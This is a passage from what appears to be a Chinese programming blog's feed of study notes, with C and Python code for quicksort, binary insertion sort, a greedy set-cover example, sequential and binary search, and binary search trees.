class="hljs-number">0</span>]=R[low];<br>    <span class="hljs-keyword">while</span>(low&lt;high)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;R[high].key&gt;=R[<span class="hljs-number">0</span>].key)<br>        &#123;<br>            --high;<br>        &#125;<br>        R[low]=R[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;R[low].key&lt;=R[<span class="hljs-number">0</span>].key)<br>        &#123;<br>            ++low;<br>        &#125;<br>        R[high]=R[low];<br>    &#125;<br>    R[low]=R[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Quicksort</span><span class="hljs-params">(RecordType R[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span><br>&#123;<br>    <span class="hljs-type">int</span> loc;<br>    <span class="hljs-keyword">if</span>(low&lt;high)<br>    &#123;<br>        loc=Partition(R,low,high); <br>        Quicksort(R,low,loc<span class="hljs-number">-1</span>);<br>        Quicksort(R,loc+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>空间复杂度O(1),时间复杂度O（n^2）</p><h2 id="五、折半插入排序"><a href="#五、折半插入排序" class="headerlink" title="五、折半插入排序"></a>五、折半插入排序</h2><p>使用直接插入排序，使用折半查找需要插入的位置；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">BinarySort</span><span class="hljs-params">(RecordType R[],<span class="hljs-type">int</span> num)</span><br>&#123;<br>    <span class="hljs-type">int</span> index1,index2;<br>    <span class="hljs-type">int</span> lowPoint,highPoint,midPoint;<br>    <span class="hljs-keyword">for</span>(index1=<span class="hljs-number">1</span>;index1&lt;=num;index1++)<br>    &#123;<br>        R[<span class="hljs-number">0</span>]=R[index1];<br>        lowPoint=<span class="hljs-number">1</span>;<br>        highPoint=index1<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(lowPoint&lt;=highPoint)<br>        &#123;<br>            midPoint=(lowPoint+highPoint)/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(R[<span class="hljs-number">0</span>].key&lt;R[midPoint].key)<br>            &#123;<br>                highPoint=midPoint<span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                lowPoint=midPoint+<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(index2=index1<span class="hljs-number">-1</span>;index2&gt;=highPoint+<span class="hljs-number">1</span>;--index2)<br>        &#123;<br>            R[index2+<span class="hljs-number">1</span>]=R[index2];<br>        &#125;<br>        R[highPoint+<span class="hljs-number">1</span>]=R[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>贪心算法</title>
    <link href="/2021/08/29/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"/>
    <url>/2021/08/29/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p><strong>思想：每一步都选择局部最优解</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#问题描述：现有几个州需要使用广播电台覆盖，每个广播电台覆盖的范围不一样，找出需要的最小的州的合集；</span><br><span class="hljs-comment">#解：使用贪心算法，（1）选出一个覆盖最多未覆盖州的电台；重复知道覆盖所有电台；</span><br><br><span class="hljs-comment"># 州名</span><br>states_need = <span class="hljs-built_in">set</span>([<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>])<br><br><span class="hljs-comment"># 可供选择的电台</span><br>stations = &#123;&#125;<br>stations[<span class="hljs-string">&quot;kone&quot;</span>] = <span class="hljs-built_in">set</span>([<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>])<br>stations[<span class="hljs-string">&quot;ktwo&quot;</span>] = <span class="hljs-built_in">set</span>([<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>])<br>stations[<span class="hljs-string">&quot;kthree&quot;</span>] = <span class="hljs-built_in">set</span>([<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>])<br>stations[<span class="hljs-string">&quot;kfoue&quot;</span>] = <span class="hljs-built_in">set</span>([<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>])<br><br><span class="hljs-comment"># 最终决定的电台</span><br>final_station = <span class="hljs-built_in">set</span>()<br><br><span class="hljs-keyword">while</span> states_need:<br>    bestStation = <span class="hljs-literal">None</span><br>    states_covered = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> station, states <span class="hljs-keyword">in</span> stations.items():<br>        <span class="hljs-comment"># 计算已经覆盖的并集</span><br>        covered = states_need &amp; states<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(covered) &gt; <span class="hljs-built_in">len</span>(states_covered):<br>            bestStation = station<br>            states_covered = covered<br><br>    states_need -= states_covered<br>    final_station.add(bestStation)<br><br><span class="hljs-built_in">print</span>(final_station)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>贪心算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CH7 查找</title>
    <link href="/2021/08/25/CH7%20%E6%9F%A5%E6%89%BE/"/>
    <url>/2021/08/25/CH7%20%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="一、顺序查找"><a href="#一、顺序查找" class="headerlink" title="一、顺序查找"></a>一、顺序查找</h2><p>MSL最大查找长度，ASL平均查找长度；</p><p>ASL成功=SumPi（n-i+1） ASL失败=n+1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> keyType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    keyType key;<br>&#125; SElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    SElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; SeqTable;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Search_Seq</span><span class="hljs-params">(SeqTable ST)</span><br>&#123;<br>    <span class="hljs-type">int</span> index;<br>    keyType key;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the target:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;key);<br>    ST.elem[ST.length].key=key;<br>    <span class="hljs-keyword">for</span>(index=<span class="hljs-number">0</span>; ST.elem[index].key!=key; ++index);<br>    <span class="hljs-keyword">if</span>(index&lt;ST.length)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find in %d&quot;</span>,index);<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    SeqTable SQT;<br>    keyType key;<br>    <span class="hljs-type">int</span> index;<br>    SElemType Data[MAXSIZE]= &#123;<span class="hljs-number">34</span>,<span class="hljs-number">44</span>,<span class="hljs-number">43</span>,<span class="hljs-number">12</span>,<span class="hljs-number">53</span>,<span class="hljs-number">55</span>,<span class="hljs-number">73</span>,<span class="hljs-number">64</span>,<span class="hljs-number">77</span>&#125;;<br>    SQT.elem=Data;<br>    SQT.length=<span class="hljs-number">9</span>;<br>    index=Search_Seq(SQT);<br>&#125;<br><span class="hljs-comment">//若找不到报错，检查scanf函数是否添加了&amp;符号v(#｀-_ゝ-)</span><br><br></code></pre></td></tr></table></figure><h2 id="二、折半查找-静态"><a href="#二、折半查找-静态" class="headerlink" title="二、折半查找(静态)"></a>二、折半查找(静态)</h2><p>必须使用顺序存贮且元素按照关键字升序；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> keyType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    keyType key;<br>&#125;SElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    SElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125;SeqTable;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">SearchBin</span><span class="hljs-params">(SeqTable ST)</span><br>&#123;<br>    <span class="hljs-type">int</span> low,mid,high;<br>    low=<span class="hljs-number">0</span>;<br>    high=ST.length<span class="hljs-number">-1</span>;<br>    keyType target;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the target:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;target);<br>    <span class="hljs-keyword">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;low:%d,mid:%d,high:%d\n&quot;</span>,low,mid,high);<br>        <span class="hljs-keyword">if</span>(target==ST.elem[mid].key)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find in position %d.&quot;</span>,mid);<br>            <span class="hljs-keyword">return</span> mid;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target&lt;ST.elem[mid].key)<br>        &#123;<br>            high=mid<span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            low=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        SeqTable T;<br>        <span class="hljs-type">int</span> index;<br>        SElemType DATA[MAXSIZE]=&#123;<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">90</span>,<span class="hljs-number">100</span>,<span class="hljs-number">120</span>&#125;;<br>        T.elem=DATA;<br>        T.length=<span class="hljs-number">9</span>;<br>        index=SearchBin(T);<br>        <span class="hljs-keyword">if</span>(index==<span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a data.\n&quot;</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> keyType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    keyType key;<br>&#125;SElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    SElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125;SeqTable;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">SearchBin</span><span class="hljs-params">(SeqTable ST)</span><br>&#123;<br>    <span class="hljs-type">int</span> low,mid,high;<br>    low=<span class="hljs-number">0</span>;<br>    high=ST.length<span class="hljs-number">-1</span>;<br>    keyType target;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the target:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;target);<br>    <span class="hljs-keyword">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class="hljs-number">2</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;low:%d,mid:%d,high:%d\n&quot;</span>,low,mid,high);<br>        <span class="hljs-keyword">if</span>(target==ST.elem[mid].key)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find in position %d.&quot;</span>,mid);<br>            <span class="hljs-keyword">return</span> mid;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target&lt;ST.elem[mid].key)<br>        &#123;<br>            high=mid<span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            low=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        SeqTable T;<br>        <span class="hljs-type">int</span> index;<br>        SElemType DATA[MAXSIZE]=&#123;<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">90</span>,<span class="hljs-number">100</span>,<span class="hljs-number">120</span>&#125;;<br>        T.elem=DATA;<br>        T.length=<span class="hljs-number">9</span>;<br>        index=SearchBin(T);<br>        <span class="hljs-keyword">if</span>(index==<span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such a data.\n&quot;</span>);<br>        &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="三、二叉排序树查找（动态）"><a href="#三、二叉排序树查找（动态）" class="headerlink" title="三、二叉排序树查找（动态）"></a>三、二叉排序树查找（动态）</h2><p>二叉树中所有的左孩子小于其父节点，右孩子大于其父节点</p><p>若根节点的左右子树高度差不超过1，则称为平衡二叉树；ASL=log2（n）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> keyType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span></span><br><span class="hljs-class">&#123;</span><br>    keyType key;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> *<span class="hljs-title">lchild</span>,*<span class="hljs-title">rchild</span>;</span><br>&#125;BTNode,*BiTree;<br><br>BiTree <span class="hljs-title function_">SearchBSTree</span><span class="hljs-params">(BTNode *T,keyType key)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!T||key==T-&gt;key) <span class="hljs-keyword">return</span> T;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;T-&gt;key) <span class="hljs-keyword">return</span>(SearchBSTree(T-&gt;lchild,key));<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span>(SearchBSTree(T-&gt;rchild,key));<br>&#125;<br><br>BTNode *<span class="hljs-title function_">SearchBST</span><span class="hljs-params">(BTNode *T,keyType key,<span class="hljs-type">int</span> *flag)</span><br>&#123;<br>    BTNode *p,*pre;<br>    <span class="hljs-comment">//flag==1，查找成功，返回该元素节点；否则查找失败，返回访问的最后一个节点；</span><br>    *flag=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(!T)<br>    &#123;<br>        *flag=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> T;<br>    &#125;<br>    p=T;<br>    pre=T;<br>    <span class="hljs-keyword">while</span>(p!=<span class="hljs-literal">NULL</span>&amp;&amp;key!=p-&gt;key)<br>    &#123;<br>        pre=p;<br>        <span class="hljs-keyword">if</span>(key&lt;p-&gt;key) p=p-&gt;lchild;<br>        <span class="hljs-keyword">else</span> p=p-&gt;rchild;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(p!=<span class="hljs-literal">NULL</span>&amp;&amp;key==p-&gt;key)<br>    &#123;<br>        *flag=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        *flag=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> pre;<br>    &#125;<br>&#125;<br><br>BTNode *<span class="hljs-title function_">InsertBSTNode</span><span class="hljs-params">(BTNode *T,keyType key)</span><br>&#123;<br>    BTNode *p,*s;<br>    <span class="hljs-type">int</span> flag=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//查找是否存在相同节点</span><br>    p=SearchBST(T,key,&amp;flag);<br>    <span class="hljs-keyword">if</span>(!flag)<br>    &#123;<br>        s=(BTNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BTNode));<br>        s-&gt;key=key;<br>        s-&gt;lchild=s-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span>(!p)<br>        &#123;<br>            <span class="hljs-keyword">return</span> s;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key&lt;p-&gt;key) p-&gt;lchild=s;<br>        <span class="hljs-keyword">else</span> p-&gt;rchild=s;<br>    &#125;<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br>BiTree <span class="hljs-title function_">Create</span><span class="hljs-params">(keyType key)</span><br>&#123;<br><br>    BiTree T;<br>    T=(BTNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BTNode));<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Asaign the memory failurely.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    T-&gt;key=key;<br>    T-&gt;lchild=T-&gt;rchild=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> T;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">VisitNode</span><span class="hljs-params">(keyType key)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,key);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InorderTree</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        InorderTree(T-&gt;lchild);<br>        VisitNode(T-&gt;key);<br>        InorderTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    BTNode *ST;<br>    keyType mykey;<br>    <span class="hljs-type">int</span> index,nums;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the nodes&#x27; number:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;nums);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the root&#x27;s data:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;mykey);<br>    ST=Create(mykey);<br><br>    <span class="hljs-keyword">for</span>(index=<span class="hljs-number">1</span>;index&lt;nums;index++)<br>    &#123;<br>        keyType tmp_key;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the %d node:&quot;</span>,index);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;tmp_key);<br>        ST=InsertBSTNode(ST,tmp_key);<br>    &#125;<br>    InorderTree(ST);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter the target data:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;mykey);<br>    